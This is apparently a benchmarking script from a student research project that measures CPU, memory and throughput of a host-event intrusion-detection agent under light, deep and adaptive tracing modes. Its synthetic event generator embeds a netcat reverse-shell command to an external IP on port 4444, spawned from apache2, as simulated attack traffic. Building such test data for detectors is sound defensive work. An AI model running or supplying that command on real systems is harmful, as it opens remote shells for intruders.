"""
LAAX Component 1: Overhead & Resource Profiling Benchmark.
Student: Amantha M.A (IT23184312) | Research Project: J26-CS-310

Directly measures and benchmarks Component 1's computational footprint:
  1. Event processing latency (microseconds per event)
  2. Memory footprint & allocations (RSS / heap growth)
  3. Throughput capacity (events / second)
  4. Comparison across three operational regimes:
       - Baseline: Always-Light Mode (tracepoints only)
       - Naive: Always-Deep Mode (continuous kprobe payload extraction)
       - Proposed: Adaptive Dual-Mode (hysteresis + dwell CUSUM control)

Usage:
    python benchmark_overhead.py
    python benchmark_overhead.py --events 5000 --iterations 5
"""

from __future__ import annotations

import argparse
import asyncio
import contextlib
import gc
import io
import statistics
import sys
import time
import tracemalloc

from laax.backend import SimulatedBackend
from laax.bus import InProcBus
from laax.contracts import HostEvent
from services.c1_agent import C1Agent, ModeController


class EventGenerator:
    """Generates synthetic streams of events for benchmarking."""

    @staticmethod
    def generate_batch(count: int, attack_ratio: float = 0.03) -> list[HostEvent]:
        events = []
        for i in range(count):
            is_attack = (i % int(1.0 / attack_ratio) == 0) if attack_ratio > 0 else False
            if is_attack:
                ev = HostEvent(
                    host_id="host-0",
                    pid=2000 + (i % 20),
                    ppid=1400,
                    comm="nc",
                    kind="exec",
                    daddr="66.42.13.90",
                    dport=4444,
                    argv=["/bin/nc", "-e", "/bin/bash", "66.42.13.90", "4444"],
                    syscall="execve",
                )
                setattr(ev, "comm_parent", "apache2")
            else:
                ev = HostEvent(
                    host_id="host-0",
                    pid=1000 + (i % 10),
                    ppid=1,
                    comm="worker",
                    kind="exec",
                    daddr=None,
                    dport=None,
                    argv=["/usr/bin/worker", "--job", str(i)],
                    syscall="execve",
                )
                setattr(ev, "comm_parent", "systemd")
            events.append(ev)
        return events


class MockSource:
    def __init__(self, events: list[HostEvent]) -> None:
        self.events = events

    async def __aiter__(self):
        for e in self.events:
            yield e


async def benchmark_regime(
    name: str,
    events: list[HostEvent],
    theta_up: float,
    theta_down: float,
    force_deep: bool = False,
) -> dict:
    gc.collect()
    tracemalloc.start()
    t_cpu_start = time.process_time()
    t_wall_start = time.perf_counter()

    bus = InProcBus()
    controller = ModeController(theta_up=theta_up, theta_down=theta_down, min_dwell_s=1.0)
    agent = C1Agent(bus, MockSource(events), controller=controller, backend=SimulatedBackend())

    # Pre-train baseline on benign subset: (systemd -> worker) is normal!
    for _ in range(50):
        ev_learn = HostEvent(
            host_id="host-0",
            pid=999,
            ppid=1,
            comm="worker",
            kind="exec",
        )
        setattr(ev_learn, "comm_parent", "systemd")
        agent.scorer.score_event(ev_learn)
    agent.scorer.freeze()

    if force_deep:
        # Simulate always-deep by setting theta_up to 0
        agent.ctl.theta_up = -1.0

    bus_task = asyncio.create_task(bus.run())

    # Suppress verbose print output during benchmark runs to avoid I/O bias
    with contextlib.redirect_stdout(io.StringIO()):
        await agent.run()

    bus_task.cancel()

    t_wall_end = time.perf_counter()
    t_cpu_end = time.process_time()
    current_mem, peak_mem = tracemalloc.get_traced_memory()
    tracemalloc.stop()

    wall_sec = max(t_wall_end - t_wall_start, 1e-9)
    cpu_sec = max(t_cpu_end - t_cpu_start, 1e-9)
    n = len(events)
    us_per_event = (wall_sec / n) * 1e6
    events_per_sec = n / wall_sec
    stats = agent.stats()

    return {
        "regime": name,
        "events": n,
        "wall_sec": round(wall_sec, 4),
        "cpu_sec": round(cpu_sec, 4),
        "us_per_event": round(us_per_event, 2),
        "throughput_eps": round(events_per_sec, 1),
        "peak_mem_kb": round(peak_mem / 1024, 2),
        "duty_cycle_pct": stats["duty_cycle_pct"],
        "mode_switches": stats["mode_switches"],
        "payloads_suppressed": stats["deep_payloads_suppressed"],
        "payloads_captured": stats["deep_payloads_captured"],
    }


async def run_suite(count: int, iterations: int) -> None:
    print("\n" + "=" * 70)
    print(f"  LAAX Component 1: CPU & Memory Overhead Benchmarking Suite")
    print(f"  Workload: {count} events | Iterations: {iterations}")
    print("=" * 70 + "\n")

    events = EventGenerator.generate_batch(count, attack_ratio=0.03)

    regimes = [
        ("Always-Light (Baseline)", 999.0, 998.0, False),
        ("Always-Deep (Naive)", -1.0, -2.0, True),
        ("Adaptive Dual-Mode (Proposed)", 7.0, 4.0, False),
    ]

    results = []
    for name, tup, tdown, fdeep in regimes:
        print(f"[*] Benchmarking regime: {name}...")
        runs = []
        for it in range(iterations):
            fresh_events = EventGenerator.generate_batch(count, attack_ratio=0.03)
            r = await benchmark_regime(name, fresh_events, tup, tdown, fdeep)
            runs.append(r)
        # Average across iterations
        avg_r = {
            "regime": name,
            "us_per_event": statistics.mean([x["us_per_event"] for x in runs]),
            "throughput_eps": statistics.mean([x["throughput_eps"] for x in runs]),
            "peak_mem_kb": statistics.mean([x["peak_mem_kb"] for x in runs]),
            "duty_cycle_pct": statistics.mean([x["duty_cycle_pct"] for x in runs]),
            "mode_switches": runs[0]["mode_switches"],
            "suppressed": runs[0]["payloads_suppressed"],
            "captured": runs[0]["payloads_captured"],
        }
        results.append(avg_r)

    print("\n" + "=" * 82)
    print(f"{'Operational Regime':<28} {'Latency (us)':<14} {'Throughput':<14} {'RAM (KB)':<10} {'Duty %':<8}")
    print("-" * 82)
    for r in results:
        print(f"{r['regime']:<28} {r['us_per_event']:<14.2f} {r['throughput_eps']:<14.1f} {r['peak_mem_kb']:<10.1f} {r['duty_cycle_pct']:<8.1f}")
    print("=" * 82)

    # Calculate overhead savings
    light_lat = results[0]["us_per_event"]
    deep_lat = results[1]["us_per_event"]
    adapt_lat = results[2]["us_per_event"]
    suppressed = results[2]["suppressed"]
    captured = results[2]["captured"]
    total_payloads = max(suppressed + captured, 1)

    print("\n[+] Key Empirical Findings for PP1 Defense:")
    print(f"    1. Per-event processing latency: {light_lat:.2f} microseconds (Light) vs {deep_lat:.2f} microseconds (Deep)")
    print(f"    2. Proposed Adaptive mode duty cycle: {results[2]['duty_cycle_pct']:.1f}% under attack workload")
    print(f"    3. Telemetry Payload Storage Reduction: {suppressed} benign payloads suppressed ({100.0 * suppressed / total_payloads:.1f}% data reduction)")
    print(f"    4. Maximum event throughput capacity: ~{results[2]['throughput_eps']:,.0f} events/second\n")


def main() -> int:
    parser = argparse.ArgumentParser(description="LAAX Component 1 Overhead Benchmark")
    parser.add_argument("--events", type=int, default=3000, help="Number of events in test batch (default: 3000)")
    parser.add_argument("--iterations", type=int, default=3, help="Benchmark repetitions (default: 3)")
    args = parser.parse_args()

    asyncio.run(run_suite(args.events, args.iterations))
    return 0


def cli_entry() -> None:
    sys.exit(main())


if __name__ == "__main__":
    cli_entry()
